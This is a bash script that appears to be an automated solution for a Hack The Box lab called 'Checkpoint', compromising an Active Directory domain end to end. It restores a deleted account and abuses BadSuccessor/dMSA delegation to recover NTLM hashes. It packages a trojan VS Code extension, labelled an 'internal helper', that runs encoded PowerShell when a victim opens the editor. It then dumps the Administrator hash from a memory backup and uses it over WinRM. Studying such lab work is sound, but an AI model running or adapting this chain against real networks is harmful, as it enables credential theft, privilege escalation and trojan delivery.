#!/usr/bin/env bash
set -euo pipefail

DOMAIN="checkpoint.htb"
ALEX_USER="alex.turner"
ALEX_PASS="Checkpoint2024!"
MARK_USER="mark.davies"
SVC_USER="svc_deploy"
ADMIN_USER="Administrator"
BAD_S4U="/home/z0n/myenv/bin/badS4U2self"

usage() {
  cat <<'EOF'
Usage: ./pwn-from-alex.sh [IP]

Starts from the provided Checkpoint credential:
  alex.turner / Checkpoint2024!

Flow:
  1. Restore the deleted Mark Davies account.
  2. Abuse BadSuccessor/dMSA to recover Mark's NTLM hash.
  3. Use Mark's DevDrop write access to install a one-shot VS Code extension.
  4. The extension runs as ryan.brooks and writes patched dMSA attributes on svc_deploy.
  5. Abuse BadSuccessor/dMSA again to recover svc_deploy's NTLM hash.
  6. Download VMBackups as svc_deploy, run Volatility hashdump, and validate Administrator.

EOF
}

die() {
  echo "[-] $*" >&2
  exit 1
}

need() {
  command -v "$1" >/dev/null 2>&1 || die "$1 is required but was not found in PATH"
}

start_progress() {
  local label="$1"
  local path="$2"
  (
    while true; do
      if [[ -f "$path" ]]; then
        printf '[*] %s progress: %s copied\n' "$label" "$(du -h "$path" | awk '{print $1}')"
      else
        printf '[*] %s progress: waiting for destination file\n' "$label"
      fi
      sleep 30
    done
  ) &
  PROGRESS_PID="$!"
}

stop_progress() {
  if [[ -n "${PROGRESS_PID:-}" ]]; then
    kill "$PROGRESS_PID" >/dev/null 2>&1 || true
    wait "$PROGRESS_PID" 2>/dev/null || true
    PROGRESS_PID=""
  fi
}

run_nxc() {
  nxc "$@"
}

dc_time() {
  local t
  t="$(nmap --script smb2-time -p445 "$TARGET" -oN - 2>/dev/null | awk '/\|   date:/ {print $3}' | sed 's/T/ /' | tail -n1)"
  [[ -n "$t" ]] || die "Could not read DC time with nmap smb2-time"
  printf '%s\n' "$t"
}

get_alex_ccache() {
  local now
  now="$(dc_time)"
  rm -f alex.turner.ccache
  TZ=UTC faketime "$now" impacket-getTGT "$DOMAIN/$ALEX_USER:$ALEX_PASS" -dc-ip "$TARGET" \
    > "$RUN_DIR/getTGT_alex.out" 2>&1 || die "getTGT failed; see $RUN_DIR/getTGT_alex.out"
  [[ -f alex.turner.ccache ]] || die "getTGT did not create alex.turner.ccache"
  cp alex.turner.ccache "$RUN_DIR/alex.ccache"
}

ccache_url() {
  python3 - "$RUN_DIR/alex.ccache" "$TARGET" <<'PY'
from urllib.parse import quote
import os
import sys
ccache = quote(os.path.abspath(sys.argv[1]), safe="")
target = sys.argv[2]
print(f"kerberos+ccache://checkpoint.htb%5Calex.turner:{ccache}@{target}/?dns={target}")
PY
}

recover_dmsa_previous_rc4() {
  local dmsa="$1"
  local outfile="$2"
  local now url
  now="$(dc_time)"
  url="$(ccache_url)"
  TZ=UTC faketime "$now" "$BAD_S4U" -v "$url" "krbtgt/$DOMAIN@$DOMAIN" "${dmsa}\$@$DOMAIN" \
    --dmsa --ccache "$RUN_DIR/${dmsa}.ccache" > "$outfile" 2>&1 || true
  awk '/dMSA previous keys/{flag=1;next} flag && /RC4:/ {print $2; exit}' "$outfile"
}

make_ryan_vsix() {
  local dmsa="$1"
  local marker="$2"
  local ext_dir="$RUN_DIR/ryan-vsix"
  local ps_b64

  mkdir -p "$ext_dir"
  ps_b64="$(python3 - "$dmsa" "$marker" <<'PY'
import base64
import sys
dmsa, marker = sys.argv[1], sys.argv[2]
script = rf"""
try {{
  $ErrorActionPreference = 'Stop'
  $dmsaDn = 'CN={dmsa},OU=Employees,DC=checkpoint,DC=htb'
  $lastError = $null
  for ($i = 1; $i -le 60; $i++) {{
    try {{
      $svc = [ADSI]'LDAP://CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb'
      $svc.PutEx(2, 'msDS-SupersededManagedAccountLink', @($dmsaDn))
      $svc.Put('msDS-SupersededServiceAccountState', 2)
      $svc.SetInfo()
      Set-Content -Path 'C:\Shares\DevDrop\{marker}' -Value 'OK'
      Get-Process Code -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
      exit 0
    }} catch {{
      $lastError = $_.Exception.Message
      Start-Sleep -Seconds 5
    }}
  }}
  throw $lastError
}} catch {{
  Set-Content -Path 'C:\Shares\DevDrop\{marker}.err' -Value $_.Exception.Message
  exit 1
}}
"""
print(base64.b64encode(script.encode("utf-16le")).decode())
PY
)"

  cat > "$ext_dir/package.json" <<EOF
{
  "name": "checkpoint-helper",
  "displayName": "Checkpoint Helper",
  "description": "Internal helper extension for Checkpoint workspace validation.",
  "version": "0.0.$((10#$(date +%H%M%S)))",
  "publisher": "checkpoint",
  "engines": {
    "vscode": "^1.118.0"
  },
  "categories": [
    "Other"
  ],
  "activationEvents": [
    "*"
  ],
  "main": "./extension.js"
}
EOF

  cat > "$ext_dir/extension.js" <<EOF
const cp = require("child_process");
const fs = require("fs");
const os = require("os");
const path = require("path");

function cleanupOldHelpers() {
  const home = os.homedir();
  const roots = [
    path.join(home, ".vscode", "extensions"),
    process.env.USERPROFILE ? path.join(process.env.USERPROFILE, ".vscode", "extensions") : ""
  ].filter(Boolean);
  for (const root of roots) {
    if (!fs.existsSync(root)) continue;
    for (const entry of fs.readdirSync(root)) {
      if (!entry.startsWith("checkpoint.checkpoint-helper-")) continue;
      const full = path.join(root, entry);
      if (path.resolve(full) === path.resolve(__dirname)) continue;
      fs.rmSync(full, { recursive: true, force: true });
    }
  }
}

function activate() {
  const marker = "C:\\\\Shares\\\\DevDrop\\\\$marker";
  fs.writeFileSync(marker + ".start", "START");
  cleanupOldHelpers();
  cp.execFile("powershell.exe", [
    "-NoProfile",
    "-ExecutionPolicy",
    "Bypass",
    "-EncodedCommand",
    "$ps_b64"
  ], { windowsHide: true }, (err, stdout, stderr) => {
    const body = [
      err ? String(err) : "OK",
      stdout || "",
      stderr || ""
    ].join("\\n");
    fs.writeFileSync(marker + ".log", body);
  });
}

function deactivate() {}

module.exports = { activate, deactivate };
EOF

  printf 'Internal workspace validation helper.\n' > "$ext_dir/readme.md"

  if command -v vsce >/dev/null 2>&1; then
    (cd "$ext_dir" && vsce package --allow-missing-repository --allow-star-activation --no-dependencies >/dev/null)
  elif command -v npx >/dev/null 2>&1; then
    (cd "$ext_dir" && npx --yes @vscode/vsce package --allow-missing-repository --allow-star-activation --no-dependencies >/dev/null)
  else
    die "Need vsce or npx to package the VSIX"
  fi

  find "$ext_dir" -maxdepth 1 -name '*.vsix' -type f | head -n1
}

TARGET="${1:-}"
if [[ "${TARGET:-}" == "-h" || "${TARGET:-}" == "--help" ]]; then
  usage
  exit 0
fi

if [[ $# -gt 1 ]]; then
  usage
  exit 1
fi

if [[ -z "$TARGET" ]]; then
  read -r -p "Target IP: " TARGET
fi

[[ -n "$TARGET" ]] || die "No target IP supplied"

need nxc
need nmap
need faketime
need impacket-getTGT
need python3
need smbclient
need bloodyAD
[[ -x "$BAD_S4U" ]] || die "badS4U2self not found at $BAD_S4U"

STAMP="$(date +%Y%m%d-%H%M%S)"
SAFE_TARGET="${TARGET//[^A-Za-z0-9_.-]/_}"
RUN_DIR="loot/pwn-${SAFE_TARGET}-${STAMP}"
BACKUP_DIR="$RUN_DIR/vmbackup"
mkdir -p "$BACKUP_DIR"

echo "[*] Target: $TARGET"
echo "[*] Output: $RUN_DIR"

echo "[*] Validating $DOMAIN\\$ALEX_USER"
if ! run_nxc smb "$TARGET" -d "$DOMAIN" -u "$ALEX_USER" -p "$ALEX_PASS" | tee "$RUN_DIR/alex_smb.txt" | grep -q "\\[+\\]"; then
  die "alex.turner credential did not validate over SMB"
fi
echo "[+] alex.turner is valid"

echo "[*] Getting Alex Kerberos ccache using DC time"
get_alex_ccache

echo "[*] Restoring deleted Mark Davies account if needed"
if ! run_nxc ldap "$TARGET" -d "$DOMAIN" -u "$ALEX_USER" -p "$ALEX_PASS" \
  --query "(sAMAccountName=$MARK_USER)" "sAMAccountName" > "$RUN_DIR/mark_query_before.txt" 2>&1 || \
  ! grep -q "Response for object" "$RUN_DIR/mark_query_before.txt"; then
  if ! bloodyAD --host "$TARGET" --dns "$TARGET" -d "$DOMAIN" -u "$ALEX_USER" -p "$ALEX_PASS" -t 30 \
    set restore "$MARK_USER" > "$RUN_DIR/restore_mark.out" 2>&1; then
    ALEX_SID="$(bloodyAD --host "$TARGET" --dns "$TARGET" -d "$DOMAIN" -u "$ALEX_USER" -p "$ALEX_PASS" -t 30 \
      get object "$ALEX_USER" --attr objectSid | awk '/objectSid:/ {print $2; exit}')"
    [[ -n "$ALEX_SID" ]] || die "Could not derive domain SID for Mark restore"
    MARK_SID="${ALEX_SID%-*}-1102"
    bloodyAD --host "$TARGET" --dns "$TARGET" -d "$DOMAIN" -u "$ALEX_USER" -p "$ALEX_PASS" -t 30 \
      set restore "$MARK_SID" >> "$RUN_DIR/restore_mark.out" 2>&1 || die "Mark restore failed; see $RUN_DIR/restore_mark.out"
  fi
fi
echo "[+] Mark is present"

MARK_DMSA="$(bloodyAD --host "$TARGET" --dns "$TARGET" -d "$DOMAIN" -u "$ALEX_USER" -p "$ALEX_PASS" -t 30 \
  get object "$MARK_USER" --attr msDS-SupersededManagedAccountLink 2>/dev/null |
  awk -F'CN=|,' '/msDS-SupersededManagedAccountLink:/ {print $2; exit}')"

if [[ -n "$MARK_DMSA" ]]; then
  echo "[*] Reusing existing Mark dMSA link ($MARK_DMSA)"
  echo "$MARK_DMSA" > "$RUN_DIR/dmsa_mark_name.txt"
else
  MARK_DMSA="FenrirM$(date +%H%M%S)"
  echo "$MARK_DMSA" > "$RUN_DIR/dmsa_mark_name.txt"
  echo "[*] Creating dMSA for Mark ($MARK_DMSA)"
  bloodyAD --host "$TARGET" --dns "$TARGET" -d "$DOMAIN" -u "$ALEX_USER" -p "$ALEX_PASS" -t 30 \
    add badSuccessor "$MARK_DMSA" -t "CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb" \
    --ou "OU=Employees,DC=checkpoint,DC=htb" > "$RUN_DIR/bad_successor_mark.out" 2>&1 || true
fi

MARK_HASH="$(recover_dmsa_previous_rc4 "$MARK_DMSA" "$RUN_DIR/badS4U2self_mark.out")"
[[ "$MARK_HASH" =~ ^[0-9a-fA-F]{32}$ ]] || die "Could not recover Mark hash; see $RUN_DIR/badS4U2self_mark.out"
echo "$MARK_HASH" > "$RUN_DIR/mark_hash.txt"
echo "[+] Recovered Mark NTLM via dMSA: <redacted>"

echo "[*] Validating Mark SMB and DevDrop access"
run_nxc smb "$TARGET" -d "$DOMAIN" -u "$MARK_USER" -H "$MARK_HASH" --shares | tee "$RUN_DIR/mark_shares.txt"
grep -q "DevDrop" "$RUN_DIR/mark_shares.txt" || die "DevDrop share not visible to Mark"

SVC_DMSA="FenrirS$(date +%H%M%S)"
echo "$SVC_DMSA" > "$RUN_DIR/dmsa_svc_name.txt"
echo "[*] Creating dMSA shell for svc_deploy ($SVC_DMSA)"
bloodyAD --host "$TARGET" --dns "$TARGET" -d "$DOMAIN" -u "$ALEX_USER" -p "$ALEX_PASS" -t 30 \
  add badSuccessor "$SVC_DMSA" -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
  --ou "OU=Employees,DC=checkpoint,DC=htb" --prepatch > "$RUN_DIR/bad_successor_svc_prepatch.out" 2>&1 || true

MARKER="svc-dmsa-${STAMP}.ok"
VSIX="$(make_ryan_vsix "$SVC_DMSA" "$MARKER")"
[[ -f "$VSIX" ]] || die "VSIX packaging failed"

echo "[*] Cleaning old DevDrop helper payloads"
smbclient "//$TARGET/DevDrop" -U "${DOMAIN}/${MARK_USER}%${MARK_HASH}" --pw-nt-hash \
  -c "del checkpoint-helper-*.vsix; del svc-dmsa-*.ok; del svc-dmsa-*.ok.start; del svc-dmsa-*.ok.log; del svc-dmsa-*.ok.err" \
  > "$RUN_DIR/cleanup_devdrop.txt" 2>&1 || true

echo "[*] Uploading one-shot VSIX for Ryan to set svc_deploy dMSA attributes"
smbclient "//$TARGET/DevDrop" -U "${DOMAIN}/${MARK_USER}%${MARK_HASH}" --pw-nt-hash \
  -c "put $VSIX $(basename "$VSIX")" > "$RUN_DIR/upload_ryan_vsix.txt" 2>&1 || die "VSIX upload failed"

echo "[*] Waiting for Ryan/VSCode extension execution marker"
for i in $(seq 1 240); do
  if smbclient "//$TARGET/DevDrop" -U "${DOMAIN}/${MARK_USER}%${MARK_HASH}" --pw-nt-hash \
    -c "lcd $RUN_DIR; get $MARKER" > "$RUN_DIR/get_marker.tmp" 2>&1; then
    echo "[+] Ryan marker received"
    break
  fi
  if (( i % 12 == 0 )); then
    echo "[*] Still waiting for Ryan marker ($((i * 5))s elapsed)"
  fi
  sleep 5
done
rm -f "$RUN_DIR/get_marker.tmp"
if [[ ! -f "$RUN_DIR/$MARKER" ]]; then
  smbclient "//$TARGET/DevDrop" -U "${DOMAIN}/${MARK_USER}%${MARK_HASH}" --pw-nt-hash \
    -c "lcd $RUN_DIR; get $MARKER.log; get $MARKER.err; get $MARKER.start" \
    > "$RUN_DIR/get_marker_debug.tmp" 2>&1 || true
  echo "[!] Ryan marker did not appear; attempting svc_deploy hash recovery anyway"
  echo "[!] Inspect $RUN_DIR/upload_ryan_vsix.txt and $RUN_DIR/$MARKER.err/log if recovery fails"
fi

echo "[*] Recovering svc_deploy NTLM via dMSA previous keys"
SVC_HASH="$(recover_dmsa_previous_rc4 "$SVC_DMSA" "$RUN_DIR/badS4U2self_svc.out")"
[[ "$SVC_HASH" =~ ^[0-9a-fA-F]{32}$ ]] || die "Could not recover svc_deploy hash; see $RUN_DIR/badS4U2self_svc.out"
echo "$SVC_HASH" > "$RUN_DIR/svc_hash.txt"
echo "[+] Recovered svc_deploy NTLM: <redacted>"

echo "[*] Validating svc_deploy WinRM and VMBackups access"
run_nxc winrm "$TARGET" -d "$DOMAIN" -u "$SVC_USER" -H "$SVC_HASH" | tee "$RUN_DIR/svc_winrm.txt" | grep -q "Pwn3d" \
  || die "svc_deploy hash did not validate over WinRM"
run_nxc smb "$TARGET" -d "$DOMAIN" -u "$SVC_USER" -H "$SVC_HASH" --shares | tee "$RUN_DIR/svc_shares.txt"
grep -q "VMBackups[[:space:]]*READ" "$RUN_DIR/svc_shares.txt" || die "VMBackups READ was not visible to svc_deploy"

echo "[*] Downloading VMBackups memory image (~2.1 GB; progress prints every 30s)"
ABS_BACKUP_DIR="$(cd "$BACKUP_DIR" && pwd)"
VMEM_NAME="Windows Server 2019-Snapshot1.vmem"
VMEM_PATH="$BACKUP_DIR/$VMEM_NAME"
start_progress "VMBackups download" "$VMEM_PATH"
if ! smbclient "//$TARGET/VMBackups" -U "${DOMAIN}/${SVC_USER}%${SVC_HASH}" --pw-nt-hash \
  -c "lcd $ABS_BACKUP_DIR; cd \"NightlyBackup_2024-11-01/memory forensics\"; get \"$VMEM_NAME\"" \
  > "$RUN_DIR/smbclient_vmbackups.txt" 2>&1; then
  stop_progress
  echo "[*] Direct .vmem download failed; falling back to recursive download"
  start_progress "VMBackups download" "$VMEM_PATH"
  smbclient "//$TARGET/VMBackups" -U "${DOMAIN}/${SVC_USER}%${SVC_HASH}" --pw-nt-hash \
    -c "lcd $ABS_BACKUP_DIR; prompt OFF; recurse ON; mget *" \
    >> "$RUN_DIR/smbclient_vmbackups.txt" 2>&1 || {
      stop_progress
      die "smbclient download failed; see $RUN_DIR/smbclient_vmbackups.txt"
    }
fi
stop_progress

VMEM="$(find "$BACKUP_DIR" -type f -iname '*.vmem' | head -n1 || true)"
[[ -n "$VMEM" ]] || die "No .vmem file downloaded from VMBackups"
echo "[+] Memory image: $VMEM"

VOL_VENV=".venv-vol"
if [[ ! -x "$VOL_VENV/bin/vol" ]]; then
  echo "[*] Creating Volatility venv"
  python3 -m venv "$VOL_VENV"
  "$VOL_VENV/bin/pip" install --upgrade pip
  "$VOL_VENV/bin/pip" install volatility3 pycryptodomex
else
  "$VOL_VENV/bin/pip" install -q pycryptodomex >/dev/null 2>&1 || true
fi

echo "[*] Running Volatility hashdump"
"$VOL_VENV/bin/vol" -q -f "$VMEM" windows.hashdump.Hashdump | tee "$RUN_DIR/vol_hashdump.txt"

ADMIN_HASH="$(awk '$1 == "Administrator" {print $4; exit}' "$RUN_DIR/vol_hashdump.txt")"
[[ "$ADMIN_HASH" =~ ^[0-9a-fA-F]{32}$ ]] || die "Could not parse Administrator NTLM from Volatility output"

echo "[+] Recovered backup Administrator hash: <redacted>"
echo "[*] Testing hash against live domain Administrator"
run_nxc winrm "$TARGET" -d "$DOMAIN" -u "$ADMIN_USER" -H "$ADMIN_HASH" | tee "$RUN_DIR/admin_winrm.txt" | grep -q "Pwn3d" \
  || die "Recovered Administrator hash did not work against live WinRM"
echo "[+] Domain Administrator WinRM Pwn3d"

echo "[*] Pulling flags"
PS_CMD="\$ErrorActionPreference='SilentlyContinue'; \
\$root = Get-Content 'C:\\Users\\max.palmer\\Desktop\\root.txt'; \
robocopy 'C:\\Users\\ryan.brooks\\Desktop' 'C:\\Windows\\Temp' 'user.txt' /B /R:0 /W:0 /NFL /NDL /NJH /NJS /NP | Out-Null; \
\$userFlag = Get-Content 'C:\\Windows\\Temp\\user.txt'; \
Remove-Item -Force 'C:\\Windows\\Temp\\user.txt' -ErrorAction SilentlyContinue; \
Write-Output \"ROOT=\$root\"; \
Write-Output \"USER=\$userFlag\""

OUT="$(run_nxc winrm "$TARGET" -d "$DOMAIN" -u "$ADMIN_USER" -H "$ADMIN_HASH" -X "$PS_CMD")"
echo "$OUT" | tee "$RUN_DIR/admin_flags.txt"

ROOT_FLAG="$(grep -Eo 'ROOT=[a-f0-9]{32}' <<<"$OUT" | head -n1 | cut -d= -f2 || true)"
USER_FLAG="$(grep -Eo 'USER=[a-f0-9]{32}' <<<"$OUT" | head -n1 | cut -d= -f2 || true)"

echo
echo "[*] Results"
[[ -n "$ROOT_FLAG" ]] && echo "[+] root.txt: $ROOT_FLAG" || echo "[-] root.txt not parsed"
[[ -n "$USER_FLAG" ]] && echo "[+] user.txt: $USER_FLAG" || echo "[-] user.txt not parsed"
echo "[*] Full run artifacts: $RUN_DIR"
